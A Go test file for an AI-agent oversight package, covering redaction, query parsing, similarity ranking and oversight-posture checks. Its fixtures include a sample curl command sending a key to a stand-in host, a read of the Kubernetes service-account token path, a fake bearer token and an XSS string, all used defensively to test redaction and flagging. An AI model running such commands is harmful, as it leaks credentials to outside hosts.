/*
Copyright (c) 2026.

MIT License - see LICENSE file for details.
*/

package oversight

import (
	"errors"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/require"

	oversightv1 "github.com/orka-agents/orka/pkg/oversight/v1"
	storagev1 "github.com/orka-agents/orka/pkg/storage/v1"
)

var testNow = time.Date(2026, 11, 25, 2, 0, 0, 0, time.UTC)

func decision(id, task string, mutate ...func(*oversightv1.OversightDecision)) oversightv1.OversightDecision {
	d := oversightv1.OversightDecision{
		ID: id, TaskName: task, AgentName: "agent-" + task, ObservedAt: testNow.Add(-time.Hour),
		Mode: oversightv1.ModeAudit, Disposition: oversightv1.DispositionAllow,
		EvidenceLevel: oversightv1.EvidenceLevelObserved,
		Coverage:      oversightv1.ActionCoverage{StreamState: "ok", SensorState: "events"},
		Action: oversightv1.ActionEnvelope{
			ToolName: "code_exec", RequestSummary: "Compute an average",
			Effects: oversightv1.ObservedEffects{
				Counts:   map[string]int{"exec": 1},
				Binaries: []oversightv1.CountedValue{{Value: "/usr/bin/python3", Count: 1}},
			},
		},
		Scorers: []oversightv1.ScorerEvaluation{{ProviderRef: "scorer-a", ModelID: "m", Status: "ok"}},
	}
	for _, m := range mutate {
		m(&d)
	}
	return d
}

func TestPrepareRedactsBoundsAndIndexes(t *testing.T) {
	d := decision("t@0", "t", func(d *oversightv1.OversightDecision) {
		d.Seq, d.RecordedAt = 99, testNow
		d.Action.RequestSummary = "use Authorization: Bearer abc.def.ghi"
		d.Action.ToolCallID = "<script>alert(1)</script>"
		d.Action.Effects.Destinations = []oversightv1.CountedValue{{Value: "cdn-lfs.modelhub.test:443", Count: 1}}
		d.Action.Effects.Paths = []oversightv1.CountedValue{{Value: "/var/run/secrets/kubernetes.io/serviceaccount/token", Count: 1}}
		d.Action.Effects.NotableEvents = []oversightv1.EffectEvent{{ID: "e1", Kind: "exec", Args: "curl https://x.example/?key=sk-secret123"}}
		d.Advisors = []oversightv1.AdvisorEvaluation{{ProviderRef: "advisor-a", ModelID: "m2", Status: "ok", Summary: strings.Repeat("é", 3000)}}
		d.CharterFindings = []oversightv1.CharterFinding{{ProducerRef: "rules", BoundID: "B1", Sentence: "No outbound sends after reading a credential."}}
	})
	stored, record, err := Prepare("team", d)
	require.NoError(t, err)
	require.Zero(t, stored.Seq)
	require.True(t, stored.RecordedAt.IsZero(), "the store assigns the recorded time")
	require.NotContains(t, string(record.Body), "abc.def.ghi")
	require.NotContains(t, string(record.Body), "sk-secret123")
	require.NotContains(t, record.SearchText, "abc.def.ghi")
	require.Equal(t, "<script>alert(1)</script>", stored.Action.ToolCallID, "markup is kept as data, never interpreted")
	require.LessOrEqual(t, len(stored.Advisors[0].Summary), oversightv1.MaxAdvisorSummaryBytes)
	require.True(t, strings.HasPrefix(record.Digest, "sha256:"))
	require.Equal(t, "team", record.Namespace)
	require.Contains(t, record.Facets, storagev1.OversightFacet{Kind: "dest_domain", Value: "modelhub.test"})
	require.Contains(t, record.Facets, storagev1.OversightFacet{Kind: "path_prefix", Value: "/var/run/secrets/*"})
	require.Contains(t, record.Facets, storagev1.OversightFacet{Kind: "signal", Value: "against_charter"})
	require.Contains(t, record.Facets, storagev1.OversightFacet{Kind: "bound", Value: "B1"})
	require.Contains(t, record.Facets, storagev1.OversightFacet{Kind: "bin", Value: "python3"})
	require.Contains(t, record.ActionNarrative, "Task t (agent agent-t) ran code_exec")
	require.Contains(t, record.ActionNarrative, "connected to cdn-lfs.modelhub.test:443")

	again, _, err := Prepare("team", d)
	require.NoError(t, err)
	_, second, _ := Prepare("team", again)
	require.Equal(t, record.Digest, second.Digest, "a stored decision prepares to the same digest")

	_, _, err = Prepare("team", decision("", "t"))
	require.ErrorIs(t, err, oversightv1.ErrInvalid)
}

func TestTruncateBytesKeepsWholeRunes(t *testing.T) {
	require.Equal(t, "abc", truncateBytes("abc", 3))
	require.Equal(t, "ab", truncateBytes("abc", 2))
	require.Equal(t, "é", truncateBytes("éé", 3))
	require.Empty(t, truncateBytes("é", 1))
	// A run of 3-byte characters loses only the one that straddles the limit.
	require.Equal(t, "€€", truncateBytes("€€€", 7))
	require.Equal(t, "€€", truncateBytes("€€€", 8))
	require.Equal(t, "€€€", truncateBytes("€€€€", 9))
	require.Equal(t, "日本", truncateBytes("日本語テキスト", 8))
	require.Equal(t, "a😀", truncateBytes("a😀😀", 7))
}

func TestParseQuery(t *testing.T) {
	filter, terms, err := ParseQuery(`dest:*.modelhub.test:* agent:a|b disposition:audit_flagged,fail_closed "token read" https://x.example minScore:0.5 since:24h task:r1-*`, testNow)
	require.NoError(t, err)
	require.Equal(t, []storagev1.OversightFacetMatch{{Kind: "dest", Value: "*.modelhub.test:*", Glob: true}}, filter.Facets)
	require.Equal(t, []string{"a", "b"}, filter.AgentNames)
	require.Equal(t, []string{"audit_flagged", "fail_closed"}, filter.Dispositions)
	require.Equal(t, []string{"token read", "https://x.example"}, filter.Text)
	require.Equal(t, 0.5, *filter.MinScore)
	require.Equal(t, testNow.Add(-24*time.Hour), filter.ObservedSince)
	require.Equal(t, "r1-", filter.TaskPrefix)
	require.Len(t, terms, 8)

	filter, _, err = ParseQuery(`concern:K1|K10 taint:credential_read`, testNow)
	require.NoError(t, err)
	require.Len(t, filter.AnyFacets, 2)
	require.Equal(t, []storagev1.OversightFacetMatch{{Kind: "taint", Value: "credential_read"}}, filter.Facets)

	for _, bad := range []string{`disposition:ok`, `minScore:2`, `"open`, `concern:`, `concern:a|b dest:x|y`, `feedback:maybe`, `since:1y`, `task:a*b`} {
		_, _, err := ParseQuery(bad, testNow)
		require.Truef(t, errors.Is(err, ErrQuery), "%s: %v", bad, err)
	}
	_, _, err = ParseQuery(strings.Repeat("a ", MaxQueryTerms+1), testNow)
	require.ErrorIs(t, err, ErrQuery)
}

func view(t *testing.T, seq int64, d oversightv1.OversightDecision, label oversightv1.FeedbackLabel) oversightv1.DecisionView {
	t.Helper()
	_, record, err := Prepare("team", d)
	require.NoError(t, err)
	record.Seq = seq
	var feedback *storagev1.OversightFeedbackRecord
	if label != "" {
		feedback = &storagev1.OversightFeedbackRecord{Label: string(label)}
	}
	v, err := View(record, feedback)
	require.NoError(t, err)
	return v
}

func TestRankSimilarExplainsMatches(t *testing.T) {
	hf := func(dest string) func(*oversightv1.OversightDecision) {
		return func(d *oversightv1.OversightDecision) {
			d.Action.Effects.Counts["net_connect"] = 1
			d.Action.Effects.Destinations = []oversightv1.CountedValue{{Value: dest, Count: 1}}
		}
	}
	source := view(t, 1, decision("a@0", "a", hf("modelhub.test:443")), "")
	exact := view(t, 2, decision("b@0", "b", hf("modelhub.test:443")), "")
	variant := view(t, 3, decision("c@0", "c", hf("cdn-lfs.modelhub.test:443")), "")
	unrelated := view(t, 4, decision("d@0", "d", func(d *oversightv1.OversightDecision) {
		d.Action.ToolName = "file_write"
		d.Action.Effects = oversightv1.ObservedEffects{}
	}), "")
	items := RankSimilar(source, []oversightv1.DecisionView{source, variant, unrelated, exact}, 10)
	require.Len(t, items, 2)
	require.Equal(t, "b@0", items[0].Decision.ID)
	require.True(t, items[0].ExactSignature)
	require.Equal(t, 1.0, items[0].Score)
	require.Equal(t, "c@0", items[1].Decision.ID)
	require.Less(t, items[1].Score, 1.0)
	require.Contains(t, items[1].Shared, oversightv1.Feature{Kind: "bin", Value: "python3"})

	matches := SimilarCandidates("team", source.Signature())
	require.Contains(t, matches, storagev1.OversightFacetMatch{Kind: "dest_class", Value: "modelhub.test:443"})
	for _, match := range matches {
		require.NotEqual(t, "tool", match.Kind)
	}

	groups := Group([]oversightv1.DecisionView{source, exact, variant, view(t, 5, decision("a@1", "a", hf("x:1")), "")}, "agent")
	require.Equal(t, "agent-a", groups[0].Key)
	require.Equal(t, 2, groups[0].Count)
	require.Equal(t, []string{"a"}, groups[0].Tasks)
}

func TestPostureIsHonestByConstruction(t *testing.T) {
	clean := view(t, 1, decision("a@0", "a"), "")
	t.Run("an empty window is blind", func(t *testing.T) {
		p := ComputePosture("team", "24h", testNow, nil, false)
		require.Equal(t, oversightv1.ConfidenceBlind, p.Confidence.State)
		require.Equal(t, oversightv1.VisibilityBlind, p.Visibility.State)
	})
	t.Run("audit mode is never warranted, even when fully visible", func(t *testing.T) {
		p := ComputePosture("team", "24h", testNow, []oversightv1.DecisionView{clean}, false)
		require.Equal(t, oversightv1.VisibilityFull, p.Visibility.State)
		require.Equal(t, oversightv1.ControlNotEnforced, p.Control.State)
		require.Equal(t, oversightv1.ConfidenceDegraded, p.Confidence.State)
		require.Contains(t, p.Confidence.Reasons, ReasonAuditMode)
	})
	t.Run("gate mode without canaries is still not warranted", func(t *testing.T) {
		gated := view(t, 1, decision("a@0", "a", func(d *oversightv1.OversightDecision) { d.Mode = oversightv1.ModeGate }), "")
		p := ComputePosture("team", "24h", testNow, []oversightv1.DecisionView{gated}, false)
		require.Equal(t, oversightv1.ControlEnforced, p.Control.State)
		require.Equal(t, oversightv1.ConfidenceDegraded, p.Confidence.State)
		require.Equal(t, []string{ReasonCanariesNotReported}, p.Confidence.Reasons)
	})
	t.Run("blind spots and unattributed events lower visibility", func(t *testing.T) {
		blind := view(t, 2, decision("b@0", "b", func(d *oversightv1.OversightDecision) {
			d.Coverage.UnattributedEvents = 11
			d.Coverage.BlindSpots = []string{"shared_runtime_pool"}
		}), "")
		p := ComputePosture("team", "24h", testNow, []oversightv1.DecisionView{clean, blind}, false)
		require.Equal(t, oversightv1.VisibilityPartial, p.Visibility.State)
		require.Contains(t, p.Visibility.Reasons, ReasonUnattributedEvents)
		require.Contains(t, p.Visibility.Reasons, ReasonBlindSpots)
		require.Equal(t, 11, p.Basis.Coverage.UnattributedEvents)
		require.Equal(t, 2, p.Basis.Coverage.ObservedEvents, "one exec in each of the two actions")
	})
	t.Run("a missing stream or unavailable sensor is blind", func(t *testing.T) {
		missing := view(t, 2, decision("b@0", "b", func(d *oversightv1.OversightDecision) { d.Coverage.SensorState = "unavailable" }), "")
		p := ComputePosture("team", "24h", testNow, []oversightv1.DecisionView{clean, missing}, false)
		require.Equal(t, oversightv1.ConfidenceBlind, p.Confidence.State)
	})
	t.Run("charter findings and fail-closed need attention until labelled false alarms", func(t *testing.T) {
		against := decision("c@0", "c", func(d *oversightv1.OversightDecision) {
			d.CharterFindings = []oversightv1.CharterFinding{{ProducerRef: "rules", BoundID: "B1", Sentence: "No sends."}}
		})
		failed := decision("d@0", "d", func(d *oversightv1.OversightDecision) { d.Disposition = oversightv1.DispositionFailClosed })
		p := ComputePosture("team", "24h", testNow, []oversightv1.DecisionView{clean, view(t, 3, against, ""), view(t, 4, failed, "")}, false)
		require.Equal(t, oversightv1.ConfidenceAttentionRequired, p.Confidence.State)
		require.Equal(t, []string{ReasonAgainstCharter, ReasonHeldOrFailClosed}, p.Confidence.Reasons)
		require.Equal(t, 1, p.Basis.CharterFindings)
		require.Equal(t, 2, p.Basis.Unreviewed)

		p = ComputePosture("team", "24h", testNow, []oversightv1.DecisionView{
			clean, view(t, 3, against, oversightv1.FeedbackFalseAlarm), view(t, 4, failed, oversightv1.FeedbackFalseAlarm),
		}, false)
		require.Equal(t, oversightv1.ConfidenceDegraded, p.Confidence.State)
		require.Equal(t, 2, p.Basis.FalseAlarms)
	})
	t.Run("a scorer failure and an incomplete read lower visibility", func(t *testing.T) {
		failing := view(t, 2, decision("b@0", "b", func(d *oversightv1.OversightDecision) { d.Scorers[0].Status = "timeout" }), "")
		p := ComputePosture("team", "24h", testNow, []oversightv1.DecisionView{failing}, true)
		require.Equal(t, oversightv1.VisibilityPartial, p.Visibility.State)
		require.Contains(t, p.Visibility.Reasons, ReasonProducerFailures)
		require.Contains(t, p.Visibility.Reasons, ReasonIncomplete)
		require.Equal(t, 1, p.Producers[0].Failures)
	})
}
